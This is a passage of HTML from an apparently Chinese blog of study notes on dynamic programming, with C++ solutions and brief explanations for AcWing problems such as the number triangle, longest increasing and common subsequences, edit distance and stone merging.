m; j &gt;= <span class="number">0</span>; j --)     <span class="comment">//枚举所有背包组</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= s[i]; k ++ )       <span class="comment">//枚举组内对象</span></span><br><span class="line">                <span class="keyword">if</span> (v[i][k] &lt;= j)</span><br><span class="line">                    f[j] = <span class="built_in">max</span>(f[j], f[j-v[i][k]] + w[i][k]);</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; f[m] &lt;&lt;endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="线性dp"><a href="#线性dp" class="headerlink" title="线性dp"></a>线性dp</h3><ul><li>递推顺序是线性的</li></ul><h3 id="AcWing-898-数字三角形"><a href="#AcWing-898-数字三角形" class="headerlink" title="AcWing 898. 数字三角形"></a>AcWing 898. 数字三角形</h3><p><img src="./../../../../../AppData/Roaming/Typora/typora-user-images/image-20240809154516799.png" alt="image-20240809154516799"></p><p>这题有两种解法：</p><ul><li>一种是像y总一样从上向下dp，然后对第n行的数据取最大值</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">510</span>, INF = <span class="number">1e9</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> a[N][N];</span><br><span class="line"><span class="type">int</span> f[N][N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ )</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j ++ )</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i][j]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i ++ )</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= i + <span class="number">1</span>; j ++ )</span><br><span class="line">            f[i][j] = -INF;</span><br><span class="line"></span><br><span class="line">    f[<span class="number">1</span>][<span class="number">1</span>] = a[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i ++ )<span class="comment">//注意边界</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j ++ )</span><br><span class="line">            f[i][j] = <span class="built_in">max</span>(f[i - <span class="number">1</span>][j - <span class="number">1</span>] + a[i][j], f[i - <span class="number">1</span>][j] + a[i][j]);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> res = -INF;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ ) res = <span class="built_in">max</span>(res, f[n][i]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, res);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>另一种是从下往上dp，最后直接输出<code>dp[1][1]</code>即可，由于保证了左下右下两个数必定存在，因此不用初始化和减少了边界可能引发的问题。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> dp[<span class="number">510</span>][<span class="number">510</span>];</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  cin &gt;&gt; n;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j++)</span><br><span class="line">    &#123;</span><br><span class="line">      cin &gt;&gt; dp[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">1</span>; i--)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j++)</span><br><span class="line">    &#123;</span><br><span class="line">      dp[i][j] = <span class="built_in">max</span>(dp[i][j] + dp[i + <span class="number">1</span>][j], dp[i][j] + dp[i + <span class="number">1</span>][j + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  cout &lt;&lt; dp[<span class="number">1</span>][<span class="number">1</span>] &lt;&lt; endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="AcWing-895-最长上升子序列"><a href="#AcWing-895-最长上升子序列" class="headerlink" title="AcWing 895. 最长上升子序列"></a>AcWing 895. 最长上升子序列</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240809163925359.png" alt="image-20240809163925359"></p><p>我们维持到达每个位置的最长上升子序列，在枚举到下一元素时，对前面进行遍历寻求最长序列。</p><p>​    </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e5</span>;</span><br><span class="line"><span class="type">int</span> a[N], dp[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin &gt;&gt; a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">       dp[i] = <span class="number">1</span>;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">       &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[j] &lt; a[i])</span><br><span class="line">                dp[i] = <span class="built_in">max</span>(dp[i], dp[j] + <span class="number">1</span>);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> maxnum = <span class="number">-1e9</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        maxnum = <span class="built_in">max</span>(maxnum, dp[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt; maxnum &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="AcWing-896-最长上升子序列-II"><a href="#AcWing-896-最长上升子序列-II" class="headerlink" title="AcWing 896. 最长上升子序列 II"></a>AcWing 896. 最长上升子序列 II</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240809180611679.png" alt="image-20240809180611679"></p><p>用二分法来查找那个最大的小于a[i]的数，然后用它来覆盖他之后的那一个长度的最小值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line"><span class="type">int</span> q[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++ ) </span><br><span class="line">        cin &gt;&gt; a[i];</span><br><span class="line">    <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="type">int</span> l = <span class="number">0</span>, r = len;</span><br><span class="line">       <span class="keyword">while</span>( l &lt; r)</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="type">int</span> mid = (l + r + <span class="number">1</span>) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">         <span class="keyword">if</span>( q[mid] &lt; a[i] )    <span class="comment">//保证是最大小于a[i]的位置，并覆盖q[r+1]</span></span><br><span class="line">            l = mid;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">            r = mid - <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       len = <span class="built_in">max</span>(len, r + <span class="number">1</span>);</span><br><span class="line">       q[r + <span class="number">1</span>] = a[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="AcWing-897-最长公共子序列"><a href="#AcWing-897-最长公共子序列" class="headerlink" title="AcWing 897. 最长公共子序列"></a>AcWing 897. 最长公共子序列</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240809183519151.png" alt="image-20240809183519151"></p><p>如果字母相同，则可以取<code>f[i][j] = f[i - 1][j - 1] + 1;</code>，若不同，由于我们前面序列是确定的（即最长公共子序列），可以确保第i，j时，最长子序列的长度不变,即<code>f[i][j] = max(f[i - 1][j], f[i][j - 1]);</code>，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">char</span> a[N], b[N];</span><br><span class="line"><span class="type">int</span> f[N][N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  cin &gt;&gt; n &gt;&gt; m &gt;&gt; a + <span class="number">1</span> &gt;&gt; b + <span class="number">1</span>;<span class="comment">//加号优先级大于&gt;&gt;</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i] == b[j])</span><br><span class="line">            f[i][j] = f[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            f[i][j] = <span class="built_in">max</span>(f[i - <span class="number">1</span>][j], f[i][j - <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; f[n][m] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="AcWing-902-最短编辑距离"><a href="#AcWing-902-最短编辑距离" class="headerlink" title="AcWing 902. 最短编辑距离"></a>AcWing 902. 最短编辑距离</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240809231656365.png" alt="image-20240809231656365"></p><p><a href="https://www.acwing.com/solution/content/5607/">AcWing 902. 最短编辑距离 - AcWing</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1)删除操作：把a[i]删掉之后a[1~i]和b[1~j]匹配</span><br><span class="line">            所以之前要先做到a[1~(i-1)]和b[1~j]匹配</span><br><span class="line">            f[i-1][j] + 1</span><br><span class="line">2)插入操作：插入之后a[i]与b[j]完全匹配，所以插入的就是b[j] </span><br><span class="line">            那填之前a[1~i]和b[1~(j-1)]匹配</span><br><span class="line">            f[i][j-1] + 1 </span><br><span class="line">3)替换操作：把a[i]改成b[j]之后想要a[1~i]与b[1~j]匹配 </span><br><span class="line">            那么修改这一位之前，a[1~(i-1)]应该与b[1~(j-1)]匹配</span><br><span class="line">            f[i-1][j-1] + 1</span><br><span class="line">            但是如果本来a[i]与b[j]这一位上就相等，那么不用改，即</span><br><span class="line">            f[i-1][j-1] + 0</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1010</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">char</span> a[N], b[N];</span><br><span class="line"><span class="type">int</span> f[N][N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%s&quot;</span>, &amp;n, a + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%s&quot;</span>, &amp;m, b + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++)      <span class="comment">//将前i个字母转为空串</span></span><br><span class="line">    f[i][<span class="number">0</span>] = i;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= m; i++)       <span class="comment">//将前i个字母转为空串</span></span><br><span class="line">    f[<span class="number">0</span>][i] = i;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">      f[i][j] = <span class="built_in">min</span>(f[i - <span class="number">1</span>][j] + <span class="number">1</span>, f[i][j - <span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (a[i] == b[j])</span><br><span class="line">        f[i][j] = <span class="built_in">min</span>(f[i][j], f[i - <span class="number">1</span>][j - <span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        f[i][j] = <span class="built_in">min</span>(f[i][j], f[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  cout &lt;&lt; f[n][m] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Acwing899编辑距离"><a href="#Acwing899编辑距离" class="headerlink" title="Acwing899编辑距离"></a>Acwing899编辑距离</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240811120141976.png" alt="image-20240811120141976"></p><p>这里采用编辑最短距离的思路，但是这题要注意<code>strlen()</code>函数，由于我们输入的位置是arr+1，因此字符串的首地址不再是pos，而是pos+1。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">15</span>, M = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> f[N][N], x;</span><br><span class="line"><span class="type">char</span> str[M][N], a[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  cin &gt;&gt; n;</span><br><span class="line">  <span class="type">int</span> m;</span><br><span class="line">  cin &gt;&gt; m;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    cin &gt;&gt; str[i] + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    cin &gt;&gt; a + <span class="number">1</span> &gt;&gt; x;</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> pos = <span class="number">0</span>; pos &lt; n; pos++) &#123;</span><br><span class="line">      <span class="type">int</span> lenpos = <span class="built_in">strlen</span>(str[pos] + <span class="number">1</span>);</span><br><span class="line">      <span class="type">int</span> lena = <span class="built_in">strlen</span>(a + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= lenpos; i++)</span><br><span class="line">        f[i][<span class="number">0</span>] = i;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= lena; i++)</span><br><span class="line">        f[<span class="number">0</span>][i] = i;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= lenpos; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= lena; j++) &#123;</span><br><span class="line">          f[i][j] = <span class="built_in">min</span>(f[i - <span class="number">1</span>][j] + <span class="number">1</span>, f[i][j - <span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> (str[pos][i] == a[j])</span><br><span class="line">            f[i][j] = <span class="built_in">min</span>(f[i - <span class="number">1</span>][j - <span class="number">1</span>], f[i][j]);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            f[i][j] = <span class="built_in">min</span>(f[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>, f[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (x &gt;= f[lenpos][lena])</span><br><span class="line">        cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; cnt &lt;&lt; endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><p>​                      <code> </code>                                                        </p><h3 id="区间DP"><a href="#区间DP" class="headerlink" title="区间DP"></a>区间DP</h3><h3 id="AcWing-282-石子合并"><a href="#AcWing-282-石子合并" class="headerlink" title="AcWing 282. 石子合并"></a>AcWing 282. 石子合并</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240811163449896.png" alt="image-20240811163449896"></p><p>这里是从每次合并二堆开始枚举，直到最后一次合并</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">310</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> s[N];</span><br><span class="line"><span class="type">int</span> f[N][N];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++) cin &gt;&gt; s[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i&lt;= n; i ++) </span><br><span class="line">        s[i] += s[i - <span class="number">1</span>];       <span class="comment">//前缀和</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> len = <span class="number">2</span>; len&lt;=n; len++)     <span class="comment">//每次合并长度</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i+ len - <span class="number">1</span> &lt;= n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> l = i;</span><br><span class="line">            <span class="type">int</span> r = i + len - <span class="number">1</span>;        <span class="comment">//每次合并多少石子</span></span><br><span class="line">            f[l][r] = <span class="number">1e8</span>;      <span class="comment">//初始化为无穷大</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> k = l; k &lt;= r; k++)</span><br><span class="line">            &#123;</span><br><span class="line">                f[l][r] = <span class="built_in">min</span>(f[l][r], f[l][k] +f[k<span class="number">+1</span>][r] + s[r] - s[l - <span class="number">1</span>])</span><br><span class="line">            ;&#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; f[<span class="number">1</span>][n] &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="AcWing-900-整数划分"><a href="#AcWing-900-整数划分" class="headerlink" title="AcWing 900. 整数划分"></a>AcWing 900. 整数划分</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240811202331656.png" alt="image-20240811202331656"></p><p>这里采用完全背包的方式，从1开始到n，由于我们一开始是用1枚举的，因此可以保证背包是满的。</p><p>//TODO</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span 